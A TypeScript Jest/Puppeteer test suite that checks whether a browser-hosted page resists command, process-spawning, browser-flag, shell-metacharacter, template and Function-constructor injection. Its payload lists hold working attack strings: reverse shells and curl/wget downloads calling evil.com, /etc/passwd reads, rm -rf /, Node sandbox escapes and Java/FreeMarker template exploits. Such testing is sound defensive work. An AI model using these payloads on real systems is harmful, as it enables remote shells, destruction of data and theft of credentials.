import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import { Browser, Page } from 'puppeteer';
import { launchBrowser } from '../../helpers/browser-launcher.js';

describe('Command Injection Security Tests', () => {
  let browser: Browser;
  let page: Page;

  beforeAll(async () => {
    browser = await launchBrowser();
    page = await browser.newPage();
  });

  afterAll(async () => {
    if (browser) {
      await browser.close();
    }
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection through evaluate', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const commandInjectionPayloads = [
        '; ls -la',
        '| whoami',
        '|| cat /etc/passwd',
        '& net user',
        '&& rm -rf /',
        '`id`',
        '$(whoami)',
        '${IFS}cat${IFS}/etc/passwd',
        '; ping -c 10 127.0.0.1',
        '| nc -e /bin/sh evil.com 4444',
        '; curl http://evil.com/shell.sh | sh',
        '\n/bin/bash\n',
        '\r\n/bin/sh\r\n',
        '; exec /bin/sh',
        '| python -c "import os; os.system(\'whoami\')"',
        "; node -e \"require('child_process').exec('id')\"",
        '&& perl -e "system(\'ls -la\')"',
        '| ruby -e "system(\'pwd\')"',
        '; php -r "system(\'whoami\');"',
        '$(touch /tmp/pwned)',
        '`touch /tmp/hacked`',
        '; wget http://evil.com/backdoor -O /tmp/backdoor',
        '| tftp -i evil.com GET backdoor.exe',
        '; echo "pwned" > /tmp/test.txt',
        '&& echo "hacked" >> /etc/passwd',
        '|| mkfifo /tmp/backpipe; nc evil.com 4444 < /tmp/backpipe | /bin/bash > /tmp/backpipe',
        '; bash -i >& /dev/tcp/evil.com/4444 0>&1',
        '| /usr/bin/env',
        '; /proc/self/exe',
        '&& /bin/sh -c id',
        '; awk \'BEGIN {system("whoami")}\'',
        "| sed '1s/.*/whoami/e'",
        '; find / -name passwd -exec cat {} \\;',
        "&& xargs -I {} /bin/sh -c '{}'",
        '|| tar cf - /etc/passwd | base64',
        '; zip -r - /etc/ | base64',
        '| dd if=/etc/passwd',
        '; crontab -l',
        '&& at now + 1 minute < /tmp/evil.sh',
        '; systemctl status',
        '| service --status-all',
        '; chown root:root /tmp/backdoor',
        '&& chmod +s /tmp/backdoor',
        '|| sudo -l',
        '; su -',
        '| doas whoami',
        '; docker run --rm alpine cat /etc/passwd',
        '&& kubectl get pods',
      ];

      for (const payload of commandInjectionPayloads) {
        try {
          // Attempt command injection through evaluate
          const result = await page.evaluate((cmd) => {
            // This should be safely sandboxed
            return cmd;
          }, payload);

          // Result should be the string itself, not executed
          expect(result).toBe(payload);

          // Check that no system commands were executed
          const processInfo = await page.evaluate(() => {
            return {
              platform: navigator.platform,
              userAgent: navigator.userAgent,
            };
          });

          // Verify we're still in browser context
          expect(processInfo.userAgent).toContain('HeadlessChrome');
        } catch (error) {
          // Command injection attempts should fail
          expect(error).toBeDefined();
        }
      }
    });

    it('should prevent process spawning', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const processSpawnAttempts = [
        'require("child_process").exec("whoami")',
        'require("child_process").spawn("ls", ["-la"])',
        'require("child_process").execSync("id")',
        'require("child_process").fork("/bin/sh")',
        'process.binding("spawn_sync").spawn({file: "/bin/sh"})',
        'process.binding("process_wrap").Process.spawn',
        'require("cluster").fork()',
        'require("worker_threads").Worker',
        'new (require("vm").Script)("process.exit()")',
        'require("fs").readFileSync("/etc/passwd")',
        'require("net").connect(4444, "evil.com")',
        'require("dgram").createSocket("udp4")',
        'require("http").request("http://evil.com")',
        'require("https").request("https://evil.com")',
        'require("dns").resolve("evil.com")',
        'require("os").userInfo()',
        'require("v8").getHeapStatistics()',
        'global.process.mainModule.require("child_process").exec("id")',
        'this.constructor.constructor("return process")().exit()',
        'Function("return process")().mainModule.require("child_process").exec("whoami")',
        '[].constructor.constructor("return process")().exit()',
        'Error.constructor.constructor("return process")().exit()',
        'RegExp.constructor.constructor("return process")().exit()',
        'Date.constructor.constructor("return process")().exit()',
        'Object.constructor.constructor("return process")().exit()',
      ];

      for (const attempt of processSpawnAttempts) {
        try {
          const result = await page.evaluate((code) => {
            try {
              return eval(code);
            } catch (e: any) {
              return { error: e.message };
            }
          }, attempt);

          // Should either throw error or return error object
          if (typeof result === 'object' && result.error) {
            expect(result.error).toMatch(
              /require is not defined|process is not defined|Cannot read|not a function/,
            );
          } else {
            // Should not successfully execute
            expect(result).not.toBeTruthy();
          }
        } catch (error) {
          // Expected to fail
          expect(error).toBeDefined();
        }
      }
    });

    it('should prevent browser command injection', async () => {
      const maliciousArgs = [
        '--remote-debugging-port=9222',
        '--remote-debugging-address=0.0.0.0',
        '--disable-web-security',
        '--allow-file-access-from-files',
        '--disable-site-isolation-trials',
        '--disable-features=IsolateOrigins,site-per-process',
        '--enable-automation',
        '--load-extension=/tmp/malicious-extension',
        '--user-data-dir=/etc/',
        '--proxy-server=http://evil.com:8080',
        '--proxy-pac-url=http://evil.com/proxy.pac',
        '--host-rules="MAP * evil.com"',
        '--host-resolver-rules="MAP * evil.com"',
        '--auth-server-allowlist="*"',
        '--auth-negotiate-delegate-allowlist="*"',
        '--unsafely-treat-insecure-origin-as-secure="http://evil.com"',
        '--ignore-certificate-errors',
        '--allow-running-insecure-content',
        '--enable-logging --log-level=0 --dump-dom',
        '--enable-speech-dispatcher',
        '--js-flags="--expose-gc --expose-wasm"',
        '--renderer-cmd-prefix="gdb -batch -ex run -ex bt"',
        '--utility-cmd-prefix="/bin/sh -c"',
        '--ppapi-flash-path=/tmp/malicious.so',
        '--register-pepper-plugins="/tmp/evil.so;application/x-evil"',
      ];

      for (const arg of maliciousArgs) {
        try {
          // Attempt to launch browser with malicious arguments
          const maliciousBrowser = await puppeteer.launch({
            headless: true,
            args: [arg],
          });

          // Check if dangerous features are enabled
          const maliciousPage = await maliciousBrowser.newPage();

          // Test if security features are still active
          const securityState = await maliciousPage.evaluate(() => {
            return {
              crossOriginIsolated: self.crossOriginIsolated,
              isSecureContext: self.isSecureContext,
              origin: self.origin,
            };
          });

          expect(securityState.isSecureContext).toBe(true);

          await maliciousBrowser.close();
        } catch (error) {
          // Some malicious args should cause launch to fail
          expect(error).toBeDefined();
        }
      }
    });

    it('should prevent shell metacharacter injection', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const shellMetacharacters = [
        '$()',
        '${}',
        '``',
        '|',
        '||',
        '&',
        '&&',
        ';',
        '\n',
        '\r\n',
        '>',
        '>>',
        '<',
        '<<',
        '*',
        '?',
        '[',
        ']',
        '(',
        ')',
        '{',
        '}',
        '!',
        '~',
        '\\',
        '$IFS',
        '${IFS}',
        '%0a',
        '%0d',
        '%0d%0a',
        '%00',
        '\\x00',
        '\\0',
        '\\x0a',
        '\\x0d',
        '\\n',
        '\\r',
        '$PATH',
        '${PATH}',
        '$HOME',
        '${HOME}',
        '$USER',
        '${USER}',
        '$SHELL',
        '${SHELL}',
        '$(id)',
        '${id}',
        '`id`',
        '${`id`}',
        '\\$(whoami)',
        '\\${whoami}',
        '\\`pwd\\`',
        '${\\`pwd\\`}',
      ];

      for (const char of shellMetacharacters) {
        const result = await page.evaluate((input) => {
          // Test if input is properly escaped/sanitized
          const testString = `echo ${input}`;
          return testString;
        }, char);

        // Should return the literal string, not execute
        expect(result).toBe(`echo ${char}`);

        // Verify no command execution occurred
        const pageTitle = await page.title();
        expect(pageTitle).toBeDefined();
      }
    });

    it('should prevent template injection', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const templateInjectionPayloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '*{7*7}',
        "{{'7'*7}}",
        '{{[].__class__.__base__.__subclasses__()}}',
        '{{config.items()}}',
        '{{request.environ}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
        '${T(java.lang.System).getenv()}',
        '#set($x = "")#set($x = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$x',
        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
        '{{[].constructor.constructor("return process")()}}',
        '{{this.constructor.constructor("return process")()}}',
        '${@java.lang.Runtime@getRuntime().exec("id")}',
        '${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '${"freemarker.template.utility.Execute"?new()("id")}',
        '\\u0024\\u007b\\u0037\\u002a\\u0037\\u007d',
        '\\x24\\x7b\\x37\\x2a\\x37\\x7d',
      ];

      for (const payload of templateInjectionPayloads) {
        const result = await page.evaluate((template) => {
          // Templates should not be evaluated
          const div = document.createElement('div');
          div.textContent = template;
          return div.textContent;
        }, payload);

        // Should return literal string, not evaluated result
        expect(result).toBe(payload);
        expect(result).not.toBe('49'); // 7*7 - should not be evaluated
        
        // Check that no actual code execution occurred by verifying
        // the result is still the literal template string
        if (payload.includes('7*7')) {
          expect(result).not.toBe('49'); // Template should not be evaluated
        }
        
        // For Java/Spring payloads, verify they weren't executed
        if (payload.includes('java.lang')) {
          expect(result).toBe(payload); // Should be literal, not executed
          expect(result).not.toMatch(/^(class |object |null|\[object)/); // Not Java object
        }
      }
    });

    it('should prevent code injection through Function constructor', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const functionInjectionPayloads = [
        'return process.exit()',
        'return require("child_process").exec("whoami")',
        'return global.process.mainModule.require("fs").readFileSync("/etc/passwd")',
        'return this.constructor.constructor("return process")()',
        'return eval("process.exit()")',
        'return (function(){return process})()',
        'return import("child_process").then(m=>m.exec("id"))',
        'throw new Error(); process.exit()',
        'debugger; process.exit()',
        'with(process){exit()}',
        'return await import("fs")',
        'return globalThis.process',
        'return Object.getPrototypeOf(global).process',
        'return Reflect.get(global, "process")',
        'return new Proxy({}, {get: (t,p) => process[p]})',
      ];

      for (const payload of functionInjectionPayloads) {
        try {
          const result = await page.evaluate((code) => {
            try {
              const fn = new Function(code);
              return fn();
            } catch (e: any) {
              return { error: e.message };
            }
          }, payload);

          // Should throw error or return error object
          if (typeof result === 'object' && result.error) {
            expect(result.error).toMatch(
              /process is not defined|require is not defined|Cannot read|import/,
            );
          } else {
            expect(result).toBeUndefined();
          }
        } catch (error) {
          // Expected to fail
          expect(error).toBeDefined();
        }
      }
    });
  });
});
